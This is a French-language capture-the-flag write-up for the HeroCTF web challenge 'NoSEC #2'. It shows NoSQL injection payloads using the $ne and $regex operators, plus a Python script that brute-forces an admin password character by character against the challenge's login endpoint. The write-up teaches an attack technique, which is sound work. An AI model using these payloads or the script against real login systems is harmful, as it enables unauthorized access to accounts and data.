# NoSEC #2

### Description

Vous devez retrouver le mot de passe de l'administrateur pour valider le challenge ! L'URL du challenge reste la même.

Format: Hero{motdepasse}

### Solution 

Deuxième niveau du challenge [NoSEC #1](https://github.com/0xSysR3ll/CTF/edit/master/HeroCTF/Web/NoSEC1/README.md)

Nous sommes toujours sur une injection NoSQL, le principe reste basiquement le même mais cette fois-ci il va falloir `bruteforcer` le mot de passe.

La payload du niveau 1 consistait à envoyer : `{"username": "admin", "password": {"$ne": randomThing}}` qui faisait valider le mot de passe.

Ici, il va falloit donc falloir faire un attaque du type `Blind NoSQL` en utilisant les regex.

On teste en envoyant : `{"username": {"$eq": "admin"}, "password": {"$regex": "" }}`

On est bien authentifié.

Avec un script python on va alors pouvoir récupérer caractère par caractère le mot de passe.


```python
import requests

passwd = ""
headers = {'Content-Type': 'application/json'}
url = "http://challs.heroctf.fr:3000/login"

for _ in range(32):
    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    for i in range(len(alphabet)):
        c = alphabet[i]
        data = '{"username": {"$eq": "admin"}, "password": {"$regex": "^'+passwd+c+'" }}'
        response = requests.post(url=url, headers=headers, data=data, verify=True)
        
        if b'success' in response.content:
            print('Nouveau caractère trouvé : ', c)
            passwd += c
            
            print("Flag : Hero{"+passwd+"}")
```

Flag : Hero{5d41402abc4b2a76b9719d911017c592}
